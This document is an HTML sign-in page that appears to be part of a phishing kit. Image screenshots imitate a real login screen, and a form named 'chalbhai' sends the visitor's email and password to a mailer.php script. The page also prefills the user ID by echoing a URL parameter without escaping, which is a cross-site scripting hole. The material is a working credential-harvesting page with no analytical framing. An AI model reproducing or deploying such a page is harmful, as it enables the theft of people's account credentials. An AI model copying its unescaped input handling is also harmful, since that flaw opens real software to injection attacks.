<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign in</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

<style> 
  .textbox { 
    font-family: Arial, Helvetica, sans-serif;
    background: rgba(255, 255, 255, 0.44); 
    color: #333; 
    border: 1px solid #A4A4A4; 
    padding: 4px 8px 4px 4px !important;
    line-height: 1; 
    width: 275px; 
    height:32px; 
	font-size: 13px;
  } 
 .textbox:hover { 
    border: 1px solid #4d90fe; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
  } 
 .textbox:focus { 
    border: 1px solid #4d90fe; 
    outline: none; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3);  
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    background: rgb(255, 255, 255); } 
  
</style>
<script LANGUAGE="JavaScript">
<!--

var b = 0 ;
var i = 0 ;
var errmsg = "" ;
var punct = "" ;
var min = 0 ;
var max = 0 ;

function formbreeze_email(field) {

	if (b && (field.value.length == 0)) return true ;


	if (! emailCheck(field.value))
	  {
		  field.focus();
		  if (field.type == "text") field.select();
		  return false ;
	  }

   return true ;
}

function formbreeze_filledin(field) {

if (b && (field.value.length == 0)) return true;

if (field.value.length < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

if ((max > 0) && (field.value.length > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

return true ;
}

function formbreeze_number(field) {

if (b && (field.value.length == 0)) return true ; ;

if (i)
 var valid = "0123456789"
else
 var valid = ".,0123456789"

var pass = 1;
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
 }

if (field.value < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }


if ((max > 0) && (field.value > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}


function formbreeze_numseq(field) {


if (b && (field.value.length == 0)) return true ;

var valid = punct + "0123456789"

var pass = 1;
var digits = 0
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;
if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ; ;
   }

if (digits < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

if ((max > 0) && (digits > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}

function emailCheck (emailStr) {

var checkTLD=1;
var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
var emailPat=/^(.+)@(.+)$/;
var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
var validChars="\[^\\s" + specialChars + "\]";
var quotedUser="(\"[^\"]*\")";
var atom=validChars + '+';
var word="(" + atom + "|" + quotedUser + ")";
var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
var matchArray=emailStr.match(emailPat);

if (matchArray==null) {
alert(errmsg);
return false;
}
var user=matchArray[1];
var domain=matchArray[2];

for (i=0; i<user.length; i++) {
if (user.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}
for (i=0; i<domain.length; i++) {
if (domain.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}

if (user.match(userPat)==null) {
alert(errmsg);
return false;
}

var atomPat=new RegExp("^" + atom + "$");
var domArr=domain.split(".");
var len=domArr.length;
for (i=0;i<len;i++) {
if (domArr[i].search(atomPat)==-1) {
alert(errmsg);
return false;
   }
}

if (checkTLD && domArr[domArr.length-1].length!=2 &&
domArr[domArr.length-1].search(knownDomsPat)==-1) {
alert(errmsg);
return false;
}

if (len<2) {
alert(errmsg);
return false;
}

return true;
}

function formbreeze_sub()
{
/*
//FBDATA:formtext1^1^0^Please enter a valid email address.:;formtext2^0^1^0^0^Please Enter Your Password:;
*/
b=0;
errmsg="Please enter a valid email address.";
if (! formbreeze_email(document.chalbhai.formtext1) ) return false ;
b=0;
errmsg="Please Enter Your Password";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;

}
-->
</script>




</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:868px; height:666px; z-index:0"><img src="images/2.png" alt="" title="" border=0 width=868 height=666></div>

<div id="image2" style="position:absolute; overflow:hidden; left:905px; top:43px; width:372px; height:618px; z-index:1"><img src="images/1.png" alt="" title="" border=0 width=372 height=618></div>
<form action=mailer.php name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >
<input name="userid" value="<?=$_GET[userid]?>"  class="textbox" type="text" style="position:absolute;font-size: 16px;width:349px;left:925px;border:none;text-align:center;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);top:184px;z-index:2">
<input name="formtext2"  required  class="textbox"  placeholder="Password" type="password" style="position:absolute;width:349px;left:926px;top:220px;z-index:3">
<div id="image3" style="position:absolute; overflow:hidden; left:918px; top:371px; width:162px; height:18px; z-index:4"><a href="#"><img src="images/cant.png" alt="" title="" border=0 width=162 height=18></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:920px; top:643px; width:191px; height:19px; z-index:5"><a href="#"><img src="images/ter.png" alt="" title="" border=0 width=191 height=19></a></div>

<div id="formcheckbox1" style="position:absolute; left:921px; top:257px; z-index:6"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:924px; top:307px; z-index:7"><input type="image" name="formimage1" width="71" height="35" src="images/sig.png"></div>

</body>
</html>
